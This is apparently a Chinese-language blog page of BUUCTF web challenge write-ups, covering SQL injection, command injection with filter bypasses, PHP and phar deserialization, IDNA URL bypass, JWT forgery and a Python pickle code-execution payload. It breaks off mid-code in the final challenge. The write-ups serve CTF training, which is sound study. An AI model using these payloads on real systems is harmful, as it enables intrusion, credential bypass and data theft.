title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p><strong>知识点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录。</span><br></pre></td></tr></table></figure><br>WEB-INF下面的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。  </span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><br><strong>解题：</strong><br>打开help页面，发现是一个download页面，但是没有下载，需要使用post传参。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="Da4er"><br>然后访问WEB-INF/web.xml，找到flag所属的类<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" class title="Da4er"><br>所以直接访问这个class类的目录：<br>找到一段base64解码得到flag<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/19.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/20.png" class title="Da4er"></p><hr><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p><strong>知识点：</strong><br>1.<strong>数组绕过正则及相关</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) &#x3D; null </span><br><span class="line">sha1(Array()) &#x3D; null </span><br><span class="line">ereg(pattern,Array()) &#x3D; null </span><br><span class="line">preg_match(pattern,Array()) &#x3D; false </span><br><span class="line">strcmp(Array(), &quot;abc&quot;) &#x3D; null </span><br><span class="line">strpos(Array(),&quot;abc&quot;) &#x3D; null </span><br><span class="line">strlen(Array()) &#x3D; null</span><br></pre></td></tr></table></figure><br>2.<strong>php反序列化长度变化尾部字符串逃逸</strong><br>假如有如下序列化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13587819970&quot;;s:5:&quot;email&quot;;s:32:&quot;44444545487956214698745621365478&quot;;s:8:&quot;nickname&quot;;s:10:&quot;12345hacke&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;f47454d1d3644127f42070181a8b9afc&quot;;&#125;</span><br></pre></td></tr></table></figure><br>经反序列化之后：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/21.png" class title="Da4er"><br>发现s:39之后的都没有被反序列化，但是正常输出了。</p><hr><p><strong>解题：</strong><br>扫描目录发现<a href="http://www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用">www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用</a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><br>这个漏洞出现在用户更新数据页面，先经过反序列化，在进行赋值。跟进函数发现对profile有三处过滤：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><br>首先是正则匹配，可以使用数组绕过；在filter函数里有两处过滤，有一处是将where转换成hacker，5个字符换成了6个字符。<br>漏洞点是出现在上传图片的参数，这个时候就是要将s:5:”photo”;s:10:”config.php”;}塞到photo参数里，让它读取config.php下的flag。可以使用反序列化尾部字符串逃逸。</p><p>在nickname上操作，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname[]</span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><br>在nickname上输入34个where，每个where都会换成hacker，多增加一个字符，最后会把s:5:”photo”;s:10:”config.php”;}挤到photo参数上。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"></p><hr><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>拿到题目，发现是命令执行漏洞。直接ls查看到有两个文件：flag.php,index.php。<br>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><br>查看到index.php源码<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><br>看到过滤了一些字符，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;lag;b&#x3D;f;cat$IFS$b$a.php;</span><br></pre></td></tr></table></figure><br>查看源代码找到flag。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"></p><hr><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>很简单的上传，直接上传phtml的<script>小马即可，没有给上传的文件所在目录，通过猜测是upload。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class="" title="Da4er"></p><hr><h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p><strong>知识点：绕过information.schema与无列名注入</strong><br>参考博客：<br><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a><br>绕过information.schema可以使用sys.schema_auto_increment_columns<br>无列注入可以自己构造列名。<br><strong>解题：</strong><br>注入发生在编辑广告的界面上，在输入广告名时会在查看报错，说明是存在二次注入的。<br>但是报错函数被过滤，可以使用union查询。<br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 判断有多少字段 -1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 </span><br><span class="line"># union 查询 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># user()发现是 root@localhost 权限 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 查看 mysql 的版本号 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 在 sys 数据库中查询表名 </span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># 通过无列名注入 users 表中的数据</span><br><span class="line"># 第二个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"># 第三个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class="" title="Da4er"></p><hr><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/32.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/33.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/34.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/35.png" class="" title="Da4er"><p>payload如下，很简单的php反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，使用handler关键字<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/36.png" class="" title="Da4er"><br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler&#96;FlagHere&#96;open+as+da4er;handler+da4er+read+first;Handler+da4er+close;&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>运用数学函数和^符号可以构造任意字符<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/37.png" class="" title="Da4er"><br>参考博客：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11588219.html</span><br><span class="line"></span><br><span class="line">有很多种解法</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p><strong>知识点：任意文件下载，phar反序列化扩展攻击</strong><br>明天好好总结一下，在wp中不讲那么详细了。<br>使用phar的三个条件说一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.phar文件要能够上传到服务器端。</span><br><span class="line">2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为&quot;跳板&quot;。</span><br><span class="line">3.文件操作函数的参数可控，且::、&#x2F;、phar等特殊字符没有被过滤。</span><br></pre></td></tr></table></figure><br>形成的phar文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList&#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array(new File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Da4er &#x3D; new User();</span><br><span class="line">$Da4er-&gt;db &#x3D; (new FileList());</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($Da4er);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/38.png" class="" title="Da4er"></p><hr><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p>打开题目，得到源码：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/39.png" class="" title="Da4er"><br>阅读源码知道，这段代码判断了三次url是否为suctf.cc，但是只有最后一个判断成立后才会把结果返回；所以必须让前两个suctf.cc判断错误。经过测试发现直接输入:<strong>suctf.cc</strong>就可以直接到最后一个判断。<br>看到url的显示，知道这个应该是任意文件读取：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/40.png" class="" title="Da4er"><br>这个其实是idna的编码问题：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/41.png" class="" title="Da4er"><br>所以直接上网找到一个脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>得到可用字符：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/42.png" class="" title="Da4er"><br>接着就是nginx目录的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">├── client_body_temp</span><br><span class="line">├── conf                              #配置文件目录</span><br><span class="line">│   ├── fastcgi.conf</span><br><span class="line">│   ├── fastcgi.conf.default</span><br><span class="line">│   ├── fastcgi_params</span><br><span class="line">│   ├── fastcgi_params.default</span><br><span class="line">│   ├── koi-utf</span><br><span class="line">│   ├── koi-win</span><br><span class="line">│   ├── mime.types</span><br><span class="line">│   ├── mime.types.default</span><br><span class="line">│   ├── nginx.conf                      #主配置文件</span><br><span class="line">│   ├── nginx.conf.default</span><br><span class="line">│   ├── scgi_params</span><br><span class="line">│   ├── scgi_params.default</span><br><span class="line">│   ├── uwsgi_params</span><br><span class="line">│   ├── uwsgi_params.default</span><br><span class="line">│   └── win-utf</span><br><span class="line">├── fastcgi_temp</span><br><span class="line">├── html                                #初始的静态页面存放目录</span><br><span class="line">│   ├── 50x.html</span><br><span class="line">│   └── index.html</span><br><span class="line">├── logs                                #日志目录</span><br><span class="line">│   ├── access.log</span><br><span class="line">│   ├── error.log</span><br><span class="line">│   └── nginx.pid</span><br><span class="line">├── proxy_temp</span><br><span class="line">├── sbin                                #启动目录</span><br><span class="line">│   └── nginx</span><br><span class="line">├── scgi_temp</span><br><span class="line">└── uwsgi_temp</span><br></pre></td></tr></table></figure><p>所以我们通过file://来读取配置文件查看一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cＣ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/43.png" class="" title="Da4er"><br>最后查看flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cＣ&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><p>首先注册一下，找到lv6会员号，在181页，单击结账。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/44.png" class="" title="Da4er"><br>将discount设为很小的数，直接爆出后台地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure><p>访问会说不是admin，查看cookie发现有个JWK，知道是基于token验证的，所以可以伪造身份。关于JWK：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">博客</a><br>所以我要先破解key值，GitHub上有一个爆破工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">1</a><br>爆破出来：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/45.png" class="" title="Da4er"><br>然后在<a href="https://jwt.io/进行伪造。">https://jwt.io/进行伪造。</a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/46.png" class="" title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/47.png" class="" title="Da4er"><br>查看源代码发现：<a href="http://www.zip">www.zip</a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/48.png" class="" title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/49.png" class="" title="Da4er"><br>反序列化脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())</span><br><span class="line">a &#x3D; urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><br>在become上传入：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/50.png" class="" title="Da4er"></p><hr><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p> 抓一下登录包，可以发现：<br> <img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/51.png" class="" title="Da4er"><br> base32-&gt;base64解密后，可以知道构造的sql语句 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>经过测试发现，username和password是分开验证的。而且没有过滤union select。<br>这里就有一个知识点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当union select查询不存在的数据的时候会自己构造一组虚拟数据。</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;0&#39; union select 1,&#39;admin&#39;,&#39;111&#39;,1;</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/52.png" class="" title="Da4er"><br>所有我们可以用这个来绕过密码的验证。<br>接着我们来猜后端的验证代码大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if($arr[&#39;username&#39;]!&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">    echo &quot;Wrong User&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if($arr[&#39;password&#39;]&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">        echo &#39;Yes&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#39;Wrong pass&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw&#x3D;123456</span><br></pre></td></tr></table></figure></p><hr><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><p>打开题目拿到源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span 